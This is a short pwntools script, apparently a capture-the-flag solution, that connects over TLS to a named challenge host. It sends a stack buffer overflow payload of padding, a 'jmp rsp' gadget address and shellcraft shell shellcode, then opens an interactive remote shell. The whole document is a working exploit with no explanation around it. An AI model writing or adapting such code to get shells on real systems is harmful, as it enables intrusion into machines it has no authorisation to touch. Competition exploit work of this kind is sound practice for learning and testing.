from pwn import *

context.arch='amd64'
HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'brunner-stocks-d04e0e484bb2e584-global.challs.brunnerne.xyz', 1337
r = remote(HOST, PORT, ssl=True)

jmp_rsp=0x401597
sh=asm(shellcraft.sh())
r.sendlineafter(b'? ', b'A'*0x18+p64(jmp_rsp)+sh)

r.interactive()